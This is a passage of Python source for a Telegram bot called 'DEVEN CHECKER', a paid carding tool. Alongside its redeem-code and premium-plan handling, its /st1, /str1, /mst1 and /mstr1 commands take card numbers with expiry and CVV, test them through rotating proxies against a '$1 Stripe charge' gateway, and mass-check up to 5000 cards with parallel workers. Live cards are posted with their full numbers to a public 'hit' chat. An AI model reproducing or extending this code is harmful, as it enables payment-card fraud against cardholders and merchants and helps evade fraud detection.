{EMOJI['clock']} Days: <b>{result['days']}</b>
{EMOJI['card']} Workers: <b>{result['workers']}</b>
{EMOJI['folder']} Mass Limit: <b>{result['mass_limit']}</b>
{EMOJI['calendar']} Expires: <b>{expiry_str}</b>"""
        await event.reply(text, parse_mode='html')
    else:
        await event.reply(f"{EMOJI['cross']} <b>Redeem Failed</b>\n\n{EMOJI['warning']} {result['error']}", parse_mode='html')
async def resolve_user_reference(raw: str):
    ref = (raw or "").strip().split()[0].strip().lstrip("@")
    if not ref:
        return None, "", "Missing user. Use user ID or @username."
    if ref.isdigit():
        return int(ref), f"<code>{ref}</code>", None
    try:
        entity = await bot.get_entity(ref)
        if not hasattr(entity, 'id'):
            return None, "", "Not a valid user."
        label = f"@{entity.username or ref} (<code>{entity.id}</code>)"
        return entity.id, label, None
    except Exception:
        return None, "", "Username not found. Use their numeric user ID if they have no username."
def admin_gencode_help_text():
    return (
        f"{EMOJI['crown']} <b>Generate Redeem Codes</b>\n"
        f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
        f"<code>/gencode &lt;plan&gt; [count] [days]</code>\n\n"
        f"<b>Plans:</b>\n"
        f"\u2022 <code>basic</code> \u2014 {PLANS['basic']['days']}d \u00b7 {PLANS['basic']['workers']}w \u00b7 {PLANS['basic']['mass_limit']}ml\n"
        f"\u2022 <code>pro</code> \u2014 {PLANS['pro']['days']}d \u00b7 {PLANS['pro']['workers']}w \u00b7 {PLANS['pro']['mass_limit']}ml\n"
        f"\u2022 <code>max</code> \u2014 {PLANS['max']['days']}d \u00b7 {PLANS['max']['workers']}w \u00b7 {PLANS['max']['mass_limit']}ml\n"
        f"\u2022 <code>ultra</code> \u2014 {PLANS['ultra']['days']}d \u00b7 {PLANS['ultra']['workers']}w \u00b7 {PLANS['ultra']['mass_limit']}ml\n\n"
        f"<b>Examples:</b>\n"
        f"<code>/gencode basic</code> \u2014 1 basic code\n"
        f"<code>/gencode pro 5 14</code> \u2014 5 pro codes, 14 days\n"
        f"<code>/gencode max 1</code> \u2014 1 max code\n"
        f"<code>/gencode ultra 3 90</code> \u2014 3 ultra codes, 90 days"
    )
@bot.on(events.NewMessage(pattern=r'/gencode(?:\s+(.+))?'))
async def gencode_cmd(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    text_match = event.pattern_match
    args = text_match.group(1) if text_match and text_match.group(1) else ''
    parts = args.strip().split()
    if not parts:
        await event.reply(admin_gencode_help_text(), parse_mode='html')
        return
    plan = parts[0].lower()
    count = int(parts[1]) if len(parts) > 1 else 1
    days = int(parts[2]) if len(parts) > 2 else 0
    if plan not in PLANS:
        await event.reply(admin_gencode_help_text(), parse_mode='html')
        return
    if count < 1 or count > 100:
        await event.reply(f"{EMOJI['warning']} Count must be between 1-100.", parse_mode='html')
        return
    codes = []
    for _ in range(count):
        code = generate_code(plan, days=days, created_by=uid)
        codes.append(code)
    code_list = '\n'.join(codes)
    await event.reply(f"{EMOJI['crown']} <b>Generated {len(codes)} {plan.upper()} code(s)</b>\n\n<code>{code_list}</code>\n\n{EMOJI['clock']} Days: <b>{days or PLANS[plan]['days']}</b> | {EMOJI['card']} Workers: <b>{PLANS[plan]['workers']}</b> | {EMOJI['folder']} Mass Limit: <b>{PLANS[plan]['mass_limit']}</b>", parse_mode='html')
@bot.on(events.NewMessage(pattern='/codes'))
async def codes_cmd(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    codes = get_active_codes()
    if not codes:
        await event.reply(f"{EMOJI['warning']} <b>No active codes.</b>", parse_mode='html')
        return
    lines_list = []
    for c in codes:
        lines_list.append(f"{EMOJI['key']} <code>{c['code']}</code> - {c['plan'].upper()} ({c['used']}/{c['max_uses']} uses)")
    text = f"{EMOJI['crown']} <b>Active Redeem Codes ({len(codes)})</b>\n\n" + '\n'.join(lines_list)
    if len(text) > 3500:
        for i in range(0, len(text), 3500):
            await event.reply(text[i:i+3500], parse_mode='html')
    else:
        await event.reply(text, parse_mode='html')
@bot.on(events.NewMessage(pattern=r'/rmcode(?:\s+(.+))?'))
async def rmcode_cmd(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    text_match = event.pattern_match
    code = text_match.group(1) if text_match and text_match.group(1) else None
    if not code:
        await event.reply(f"{EMOJI['warning']} <b>Usage:</b> <code>/rmcode CODE</code>", parse_mode='html')
        return
    if revoke_code(code):
        await event.reply(f"{EMOJI['checkmark']} <b>Code revoked:</b> <code>{code}</code>", parse_mode='html')
    else:
        await event.reply(f"{EMOJI['cross']} <b>Code not found.</b>", parse_mode='html')
@bot.on(events.NewMessage(pattern=r'^(?:DEVEN|SHOPI)-[A-Z0-9][A-Z0-9-]{5,}$'))
async def auto_redeem(event):
    uid = event.sender_id
    code = event.message.text.strip()
    result = redeem_code(code, uid)
    if result['success']:
        expiry_str = result.get('expiry', 'N/A')
        text = f"""{EMOJI['crown']} <b>Redeem Successful!</b>
{EMOJI['bolt']} Plan: <b>{result['plan'].upper()}</b>
{EMOJI['clock']} Days: <b>{result['days']}</b>
{EMOJI['card']} Workers: <b>{result['workers']}</b>
{EMOJI['folder']} Mass Limit: <b>{result['mass_limit']}</b>
{EMOJI['calendar']} Expires: <b>{expiry_str}</b>"""
        await event.reply(text, parse_mode='html')
    else:
        await event.reply(f"{EMOJI['cross']} <b>Redeem Failed</b>\n\n{EMOJI['warning']} {result['error']}", parse_mode='html')
@bot.on(events.NewMessage(pattern=r'^/st1\s+'))
async def pp5_check(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users."), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ <b>No proxies</b>\n\nproxy.txt is empty."), parse_mode='html')
        return
    text = event.message.text.strip()
    parts = text.split(' ', 1)
    if len(parts) < 2:
        await event.reply(premium_emoji("❌ <b>Usage</b>\n\n<code>/st1 card|mm|yy|cvv</code>"), parse_mode='html')
        return
    cards = extract_cc(parts[1])
    if not cards:
        await event.reply(premium_emoji("❌ <b>Invalid format</b>\n\nUse: <code>/st1 card|mm|yy|cvv</code>"), parse_mode='html')
        return
    card = cards[0]
    cc, mm, yy, cvv = card.split('|')
    status_msg = await event.reply(premium_emoji(f"⚡️ 𝐃𝐄𝐕𝐄𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡️\n\n💳 CC : <code>{card}</code>\nChecking…"), parse_mode='html')
    try:
        proxy = random.choice(proxies) if proxies else None
        start = time.time()
        is_live, msg = await asyncio.wait_for(asyncio.to_thread(check_pp5, cc, mm, yy, cvv, proxy=proxy), timeout=120)
        elapsed = round(time.time() - start, 2)
        status_emoji = EMOJI['charged'] if is_live else EMOJI['declined']
        status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if is_live else "𝐃𝐄𝐀𝐃 𝐂𝐀𝐑𝐃"
        brand, bin_type, level, bank, country, flag = "", "", "", "", "", ""
        try:
            brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
        except:
            pass
        gate_label = "Stripe $1 Charge"
        final_resp = f"""「 {EMOJI['bolt']} <b>DEVEN CHECKER</b> {EMOJI['bolt']} 」
{status_emoji} <b>{status_text}</b>
{EMOJI['card']} <b>CC</b> <code>{card}</code>
🌐 <b>Gateway</b> {gate_label}
📋 <b>Response</b> {msg[:150]}
💵 <b>Price</b> $1.00
{EMOJI['search']} <b>BIN</b> {brand} - {bin_type} - {level}
🏦 <b>Bank</b> {bank}
🌐 <b>Country</b> {country} {flag}
⏱️ <b>Time</b> {elapsed}s
{DIV}
Made by <a href="https://t.me/zyokt">𝐃𝐞𝐯𝐞𝐧</a>"""
        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
        if is_live:
            now = datetime.now().strftime("%H:%M:%S")
            public_text = (
                f"<b>🔥 Hit Detected! 🔥</b>\n\n"
                f"▸ 📍 Status · <b>Charged</b>\n"
                f"▸ 🛒 Gateway · <b>{gate_label}</b>\n"
                f"▸ 📝 Response · <code>{msg[:80]}</code>\n"
                f"▸ 👤 User · @{username}\n"
                f"▸ ⏱️ · {now}\n"
                f"▸ 💳 <code>{card}</code>"
            )
            try:
                await bot.send_message(HIT_CHAT_ID, premium_emoji(public_text), parse_mode='html')
            except:
                pass
    except Exception as exc:
        await status_msg.edit(premium_emoji(f"❌ Error: {html.escape(str(exc)[:200])}"), parse_mode='html')
@bot.on(events.NewMessage(pattern=r'^/str1\s+'))
async def str1_check(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users."), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ <b>No proxies</b>\n\nproxy.txt is empty."), parse_mode='html')
        return
    text = event.message.text.strip()
    parts = text.split(' ', 1)
    if len(parts) < 2:
        await event.reply(premium_emoji("❌ <b>Usage</b>\n\n<code>/str1 card|mm|yy|cvv</code>"), parse_mode='html')
        return
    cards = extract_cc(parts[1])
    if not cards:
        await event.reply(premium_emoji("❌ <b>Invalid format</b>\n\nUse: <code>/str1 card|mm|yy|cvv</code>"), parse_mode='html')
        return
    card = cards[0]
    cc, mm, yy, cvv = card.split('|')
    status_msg = await event.reply(premium_emoji(f"⚡️ 𝐃𝐄𝐕𝐄𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡️\n\n💳 CC : <code>{card}</code>\nChecking…"), parse_mode='html')
    try:
        proxy = random.choice(proxies) if proxies else None
        start = time.time()
        is_live, msg = await asyncio.wait_for(asyncio.to_thread(check_st1_1, cc, mm, yy, cvv, proxy=proxy), timeout=120)
        elapsed = round(time.time() - start, 2)
        status_emoji = EMOJI['charged'] if is_live else EMOJI['declined']
        status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if is_live else "𝐃𝐄𝐀𝐃 𝐂𝐀𝐑𝐃"
        brand, bin_type, level, bank, country, flag = "", "", "", "", "", ""
        try:
            brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
        except:
            pass
        gate_label = "Stripe 1$ Charge"
        final_resp = f"""「 {EMOJI['bolt']} <b>DEVEN CHECKER</b> {EMOJI['bolt']} 」
{status_emoji} <b>{status_text}</b>
{EMOJI['card']} <b>CC</b> <code>{card}</code>
🌐 <b>Gateway</b> {gate_label}
📋 <b>Response</b> {msg[:150]}
💵 <b>Price</b> $1.00
{EMOJI['search']} <b>BIN</b> {brand} - {bin_type} - {level}
🏦 <b>Bank</b> {bank}
🌐 <b>Country</b> {country} {flag}
⏱️ <b>Time</b> {elapsed}s
{DIV}
Made by <a href="https://t.me/zyokt">𝐃𝐞𝐯𝐞𝐧</a>"""
        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
        if is_live:
            now = datetime.now().strftime("%H:%M:%S")
            public_text = (
                f"<b>🔥 Hit Detected! 🔥</b>\n\n"
                f"▸ 📍 Status · <b>Charged</b>\n"
                f"▸ 🛒 Gateway · <b>{gate_label}</b>\n"
                f"▸ 📝 Response · <code>{msg[:80]}</code>\n"
                f"▸ 👤 User · @{username}\n"
                f"▸ ⏱️ · {now}\n"
                f"▸ 💳 <code>{card}</code>"
            )
            try:
                await bot.send_message(HIT_CHAT_ID, premium_emoji(public_text), parse_mode='html')
            except:
                pass
    except Exception as exc:
        await status_msg.edit(premium_emoji(f"❌ Error: {html.escape(str(exc)[:200])}"), parse_mode='html')
@bot.on(events.NewMessage(pattern=r'^/mst1$'))
async def mpp5_mass(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users."), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file with <code>/mst1</code>."), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
        return
    if not load_proxies():
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("⚙️ Analyzing cards…"), parse_mode='html')
    file_bytes = await reply_msg.download_media(bytes)
    content = file_bytes.decode('utf-8', errors='ignore')
    cards = extract_cc(content)
    if not cards:
        await status_msg.edit(premium_emoji("❌ No valid cards found."), parse_mode='html')
        return
    if len(cards) > 5000:
        cards = cards[:5000]
    total_cards = len(cards)
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False, 'gate': 'mpp5'}
    all_results = {'charged': [], 'approved': [], 'dead': [], 'total': total_cards, 'checked': 0, 'start_time': time.time()}
    try:
        proxies = load_proxies()
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        last_update = [time.time()]
        async def worker():
            while not queue.empty() and session_key in active_sessions:
                state = active_sessions.get(session_key)
                if not state:
                    break
                while state.get('paused'):
                    await asyncio.sleep(1)
                    state = active_sessions.get(session_key)
                    if not state:
                        return
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                cc, mm, yy, cvv = card.split('|')
                retries = 0
                while retries < 2:
                    proxy = random.choice(proxies) if proxies else None
                    try:
                        is_live, msg = await asyncio.wait_for(asyncio.to_thread(check_pp5, cc, mm, yy, cvv, proxy=proxy), timeout=120)
                        break
                    except asyncio.TimeoutError:
                        is_live, msg = False, "Request timeout"
                    except Exception as exc:
                        is_live, msg = False, str(exc)[:100]
                        break
                    if 'timeout' in msg.lower() or 'proxy dead' in msg.lower():
                        retries += 1
                        continue
                    break
                all_results['checked'] += 1
                if is_live:
                    all_results['charged'].append({'card': card, 'message': msg, 'gateway': 'Stripe $1 Charge'})
                else:
                    all_results['dead'].append({'card': card, 'message': msg, 'gateway': 'Stripe $1 Charge'})
                queue.task_done()
                now = time.time()
                if now - last_update[0] >= 2.0:
                    last_update[0] = now
                    if session_key in active_sessions:
                        try:
                            elapsed = int(time.time() - all_results['start_time'])
                            prog = f"""「 {EMOJI['bolt']} <b>ST1 Mass Check</b> {EMOJI['bolt']} 」
💳 <b>Total</b> {total_cards}
{EMOJI['stats']} <b>Checked</b> {all_results['checked']}/{total_cards}
⏱️ <b>Duration</b> {elapsed}s
{EMOJI['charged']} <b>Charged</b> {len(all_results['charged'])}
{EMOJI['declined']} <b>Dead</b> {len(all_results['dead'])}"""
                            await status_msg.edit(premium_emoji(prog), buttons=[[Button.inline(" ⏸ Pause", b"pause", icon=emoji_id("num_2"), style="primary"), Button.inline(" ▶ Resume", b"resume", icon=emoji_id("num_2"), style="primary")], [Button.inline(" ⏹ Stop", b"stop", icon=emoji_id("num_2"), style="danger")]], parse_mode='html')
                        except:
                            pass
        workers = [asyncio.create_task(worker()) for _ in range(10)]
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
    except Exception as exc:
        await bot.send_message(user_id, f"Error: {exc}")
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await status_msg.delete()
        except:
            pass
        await send_final_results(user_id, all_results)
@bot.on(events.NewMessage(pattern=r'^/mstr1$'))
async def mstr1_mass(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users."), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file with <code>/mstr1</code>."), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
        return
    if not load_proxies():
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("⚙️ Analyzing cards…"), parse_mode='html')
    file_bytes = await reply_msg.download_media(bytes)
    content = file_bytes.decode('utf-8', errors='ignore')
    cards = extract_cc(content)
    if not cards:
        await status_msg.edit(premium_emoji("❌ No valid cards found."), parse_mode='html')
        return
    if len(cards) > 5000:
        cards = cards[:5000]
    total_cards = len(cards)
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False, 'gate': 'mstr1'}
    all_results = {'charged': [], 'approved': [], 'dead': [], 'total': total_cards, 'checked': 0, 'start_time': time.time()}
    try:
        proxies = load_proxies()
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        last_update = [time.time()]
        async def worker():
            while not queue.empty() and session_key in active_sessions:
                state = active_sessions.get(session_key)
                if not state:
                    break
                while state.get('paused'):
                    await asyncio.sleep(1)
                    state = active_sessions.get(session_key)
                    if not state:
                        return
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                cc, mm, yy, cvv = card.split('|')
                retries = 0
                while retries < 2:
                    proxy = random.choice(proxies) if proxies else None
                    try:
                        is_live, msg = await asyncio.wait_for(asyncio.to_thread(check_st1_1, cc, mm, yy, cvv, proxy=proxy), timeout=120)
                        break
                    except asyncio.TimeoutError:
                        is_live, msg = False, "Request timeout"
                    except Exception as exc:
                        is_live, msg = False, str(exc)[:100]
                        break
                    if 'timeout' in msg.lower() or 'proxy dead' in msg.lower():
                        retries += 1
                        continue
                    break
                all_results['checked'] += 1
                if is_live:
                    all_results['charged'].append({'card': card, 'message': msg, 'gateway': 'Stripe 1$ Charge'})
                else:
                    all_results['dead'].append({'card': card, 'message': msg, 'gateway': 'Stripe 1$ Charge'})
                queue.task_done()
                now = time.time()
                if now - last_update[0] >= 2.0:
                    last_update[0] = now
                    if session_key in active_sessions:
                        try:
                            elapsed = int(time.time() - all_results['start_time'])
                            prog = f"""「 {EMOJI['bolt']} <b>STR1 Mass Check</b> {EMOJI['bolt']} 」
💳 <b>Total</b> {total_cards}
{EMOJI['stats']} <b>Checked</b> {all_results['checked']}/{total_cards}
⏱️ <b>Duration</b> {elapsed}s
{EMOJI['charged']} <b>Charged</b> {len(all_results['charged'])}
{EMOJI['declined']} <b>Dead</b> {len(all_results['dead'])}"""
                            await status_msg.edit(premium_emoji(prog), buttons=[[Button.inline(" ⏸ Pause", b"pause", icon=emoji_id("num_2"), style="primary"), Button.inline(" ▶ Resume", b"resume", icon=emoji_id("num_2"), style="primary")], [Button.inline(" ⏹ Stop", b"stop", icon=emoji_id("num_2"), style="danger")]], parse_mode='html')
                        except:
                            pass
        workers = [asyncio.create_task(worker()) for _ in range(10)]
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
    except Exception as exc:
        await bot.send_message(user_id, f"Error: {exc}")
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await status_msg.delete()
        except:
            pass
        await send_final_results(user_id, all_results)
async def premium_cleanup_loop():
    while True:
        await asyncio.sleep(3600)
        try:
            expired = get_expired_premium_users()
            for user in expired:
                remove_expired_user(user['user_id'])
        except Exception as e:
            print(f"[Premium Cleanup] Error: {e}")
loop = asyncio.get_event_loop()
loop.create_task(premium_cleanup_loop())
print("✅ Bot started successfully!")
bot.run_until_disconnected()